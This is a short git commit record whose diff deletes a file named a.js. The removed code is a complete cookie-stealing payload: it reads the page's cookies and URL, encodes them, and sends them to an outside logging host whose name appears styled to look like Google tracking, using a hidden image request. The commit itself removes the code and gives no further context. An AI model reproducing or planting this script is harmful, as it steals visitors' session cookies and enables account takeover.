5d30df94519b0792536a1b4ee9172146e51c6595
9os <druidboykoston@gmail.com>
2018-11-21 17:41:20 -0600

    Delete a.js

--- a.js
+++
@@ -1,7 +0,0 @@
-cookie = "Cookies:"+document.cookie;
-url = "URL:"+document.location;
-
-$data = encodeURIComponent(cookie+url);
-
-var imageObject = new Image();
-imageObject.src = "http://googltrack.vacau.com/log.php?log="+$data;
